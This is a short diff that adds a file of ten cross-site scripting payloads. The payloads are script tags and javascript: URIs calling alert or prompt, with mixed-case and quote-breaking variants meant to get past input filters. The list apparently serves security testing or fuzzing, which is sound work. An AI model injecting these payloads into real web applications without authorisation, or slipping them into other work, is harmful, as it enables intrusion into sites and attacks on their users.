@@ -1,0 +1,10 @@
+<script>alert('xss')</script>
+<SCRIPT>alert('XSS');</SCRIPT>
+<script>alert(\"xss\")</script>
+1<ScRiPt>prompt(XSS)</ScRiPt>"
+//1<ScRiPt>prompt(XSS)</ScRiPt>
+'\"</scRipt><scRipt>alert('xss')</scRipt>
+<scRiPt>alert(XSS);</scrIPt>
+\"><scRipt>alert('xss')</scRipt>
+javascript:alert(xss)
+<>javascript:alert('XSS')
